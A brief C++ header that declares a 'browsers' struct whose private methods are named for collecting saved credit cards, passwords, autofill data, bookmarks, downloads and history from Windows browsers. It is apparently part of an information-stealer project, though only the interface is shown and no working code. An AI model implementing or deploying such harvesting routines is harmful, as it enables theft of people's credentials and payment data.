#include "../../win.h"

struct browsers {
public:
	void run();
private:
	void get_credit_cards();
	void get_passwords();
	void get_autofills();
	void get_bookmarks();
	void get_downloads();
	void get_history();
};

extern browsers g_browsers;